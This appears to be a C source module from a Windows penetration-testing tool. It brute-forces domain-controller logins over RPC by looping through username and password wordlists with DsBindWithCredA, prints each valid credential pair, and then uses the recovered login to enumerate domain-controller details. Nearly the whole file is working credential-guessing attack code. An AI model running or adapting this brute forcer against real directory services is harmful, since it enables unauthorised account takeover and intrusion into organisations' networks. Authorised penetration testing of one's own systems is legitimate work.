#include <stdio.h>
#include <windows.h>
#include <ntdsapi.h>

#include "Network.h"
#include "MgArguments.h"

#pragma comment(lib, "Ntdsapi.lib")


VOID RpcErrorMessage(DWORD errorCode) {
	printf("[x] Error");

	// https://www.seattlepro.com/rpc-error-codes/
	switch (errorCode) {
	case ERROR_ACCESS_DENIED:
		printf(": Access denied");
		break;
	case RPC_S_SERVER_UNAVAILABLE:
		printf(": RPC_S_SERVER_UNAVAILABLE");
		break;
	default:
		printf(" unknow: %lu", errorCode);
		break;
	}
	printf("\n");
}


BOOL RpcAuthBind(char* DomainControllerName, char* DnsDomainName, char* username, char* domain, char* password, BOOL isVerbose, HANDLE* phDS) {
	RPC_AUTH_IDENTITY_HANDLE AuthIdentity;

	if (DsMakePasswordCredentialsA(username, domain, password, &AuthIdentity) == ERROR_SUCCESS) {
		DWORD ret = DsBindWithCredA(DomainControllerName, DnsDomainName, AuthIdentity, phDS);
		if (ret == ERROR_SUCCESS) {
			if (isVerbose)
				printf("\t[RPC] Connected to %s\n", DomainControllerName);
			DsFreePasswordCredentials(AuthIdentity);
			return TRUE;//DsUnBind(phDS);
		} else {
			if (isVerbose)
				RpcErrorMessage(ret);
		}
		DsFreePasswordCredentials(AuthIdentity);
	}
	return FALSE;
}
BOOL RpcBind(char* DomainControllerName, char* DnsDomainName, HANDLE* phDS) {
	DWORD ret = DsBindA(DomainControllerName, DnsDomainName, phDS);
	if (ret == ERROR_SUCCESS)
		return TRUE;
	else
		RpcErrorMessage(ret);
	return FALSE;
}
BOOL __RpcAuthBruteForce(char* DomainControllerName, char* domain, StructWordList structWordList, StructCredentials* structCredentials) {
	HANDLE phDS;

	for (UINT i = 0; i < structWordList.nbUsername; i++) {
		for (UINT j = 0; j < structWordList.nbPassword; j++) {
			if (RpcAuthBind(DomainControllerName, DomainControllerName, structWordList.usernameTab[i], domain, structWordList.passwordTab[j], FALSE, &phDS)) {
				printf("\t[+] Login: '%s:%s' !\n", structWordList.usernameTab[i], structWordList.passwordTab[j]);

				size_t usernameSize = strlen(structWordList.usernameTab[i]) + 1;

				structCredentials->username = (char*)malloc(usernameSize);
				if (structCredentials->username != NULL) {
					size_t passwordSize = strlen(structWordList.passwordTab[j]) + 1;

					strcpy_s(structCredentials->username, usernameSize, structWordList.usernameTab[i]);

					structCredentials->password = (char*)malloc(passwordSize);
					if (structCredentials->password != NULL) {
						strcpy_s(structCredentials->password, passwordSize, structWordList.passwordTab[j]);
						DsUnBindA(phDS);
						return TRUE;
					}else{
						printf("[x] Malloc return NULL !\n");
						free(structCredentials->username);
						structCredentials->username = NULL;
					}
				}else{
					printf("[x] Malloc return NULL !\n");
				}
				DsUnBindA(phDS);
			}
			printOut(NULL, "\t\t[i] %i/%i\r", i * structWordList.nbPassword + j + 1,structWordList.nbPassword * structWordList.nbUsername);
				
		}
	}
	printf("\t[x] Fail to brute force RPC !\n");
	return FALSE;
}


BOOL GetDomainControllerInfo(HANDLE phDS) {
	DS_DOMAIN_CONTROLLER_INFO_1A* pInfo;
	DWORD pcOut;
	DWORD ret = DsGetDomainControllerInfoA(phDS, "pentest.local", 1, &pcOut, &pInfo);
	if (ret == ERROR_SUCCESS) {
		printf("[RCP] Domain Controller Info:\n");
		printf("\t[RCP] NetbiosName: %s\n", pInfo->NetbiosName);
		printf("\t[RCP] ComputerObjectName: %s\n", pInfo->ComputerObjectName);
		printf("\t[RCP] SiteName: %s\n", pInfo->SiteName);
		printf("\t[RCP] ServerObjectName: %s\n", pInfo->ServerObjectName);
		printf("\t[RCP] DnsHostName: %s\n", pInfo->DnsHostName);
		DsFreeDomainControllerInfoA(1, pcOut, pInfo);
		return TRUE;
	}
	return FALSE;
}


BOOL RpcAuthBruteForce(BruteforceStruct bruteforceStruct){
	char* domainName = bruteforceStruct.domain;
	if (domainName == NULL)
		domainName = "";
	return __RpcAuthBruteForce(bruteforceStruct.hostname, domainName, bruteforceStruct.structWordList, &(bruteforceStruct.structCredentials));
}

// Protocol DCERPC
// NTLMSSP_AUTH


 // int EnumRPC("DC1","pentest.local", StructWordList structWordList) {
int EnumRPC(char* NameDC,char* domainName, StructWordList structWordList) {
	
	HANDLE phDS;
	if (domainName == NULL)
		domainName = "";
	if (RpcBind(NameDC, NameDC, &phDS)) {
		GetDomainControllerInfo(phDS);
		DsUnBindA(phDS);
	}else{
		if (structWordList.isBruteForce) {
			StructCredentials structCredentials;
			if (__RpcAuthBruteForce(NameDC, domainName, structWordList, &structCredentials)) {
				if (RpcAuthBind(NameDC, NameDC, structCredentials.username, domainName, structCredentials.password, TRUE, &phDS)) {
					GetDomainControllerInfo(phDS);
					DsUnBindA(phDS);
				}

			}
		}
	}
	return FALSE;
}
